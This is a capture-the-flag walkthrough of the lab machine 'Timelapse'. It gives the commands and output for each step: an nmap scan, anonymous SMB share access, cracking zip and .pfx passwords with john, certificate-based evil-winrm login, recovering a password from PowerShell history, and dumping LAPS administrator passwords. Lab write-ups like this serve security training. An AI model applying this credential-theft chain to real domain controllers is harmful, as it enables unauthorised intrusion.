
└─$ nmap -sC -sV -Pn 10.10.11.152 -oN initial.nmap

    # Nmap 7.92 scan initiated Wed Apr 27 10:30:54 2022 as: nmap -sC -sV -Pn -oN initial.nmap 10.10.11.152
    Nmap scan report for 10.10.11.152
    Host is up (0.019s latency).
    Not shown: 989 filtered tcp ports (no-response)
    PORT     STATE SERVICE           VERSION
    53/tcp   open  domain            Simple DNS Plus
    88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-04-27 22:31:05Z)
    135/tcp  open  msrpc             Microsoft Windows RPC
    139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
    389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  ldapssl?
    3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
    3269/tcp open  globalcatLDAPssl?
    Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: 7h59m59s
    | smb2-security-mode: 
    |   3.1.1: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2022-04-27T22:31:13
    |_  start_date: N/A

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Wed Apr 27 10:31:49 2022 -- 1 IP address (1 host up) scanned in 55.41 seconds

smbclient -L //10.10.11.152 -N

      Sharename       Type      Comment
      ---------       ----      -------
      ADMIN$          Disk      Remote Admin
      C$              Disk      Default share
      IPC$            IPC       Remote IPC
      NETLOGON        Disk      Logon server share 
      Shares          Disk      
      SYSVOL          Disk      Logon server share 
    Reconnecting with SMB1 for workgroup listing.
    do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
    Unable to connect with SMB1 -- no workgroup available

Connect to `Shares` folder
`└─$ smbclient \\\\10.10.11.152\\Shares -N`

Once you are in, `mget` all the files in Shares folder. Use `prompt` to get rid of the yes/no confirmation. 

    smb: \> help prompt
    HELP prompt:
      toggle prompting for filenames for mget and mput

Crack the .zip with `zip2john` and `john` and get the .pfx file

Next step is to crack the password for the .pfx file with `pfx2john` and extract the `.crt` and `private key` from the .pfx file with the password found within .pfx. Use the following command to extract:

[Reference](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)

Run the following command to extract the private key:

    openssl pkcs12 -in [yourfile.pfx] -nocerts -out [private.key]
    
Run the following command to extract the certificate:

    openssl pkcs12 -in [yourfile.pfx] -clcerts -nokeys -out [legacyy.crt]

Use the following command to get the foothold and get user.txt

    └─$ evil-winrm -i 10.10.11.152 -S -c legacyy.crt -k private.key
    
Next we can use the following command `get-psreadlineoption` to get the path to powershell history file

Read the history file and you should be able to get the password for another user

Access the user powershell with this command `└─$ evil-winrm -i 10.10.11.152 -u $USER -p $PASSWORD -S`

Use this command to get the administrator password `Get-ADComputer -Filter * -Properties MS-Mcs-AdmPwd | Where-Object MS-Mcs-AdmPwd -ne $null | FT Name, MS-Mcs-AdmPwd` and once again login with `evil-winrm` to get the root flag.
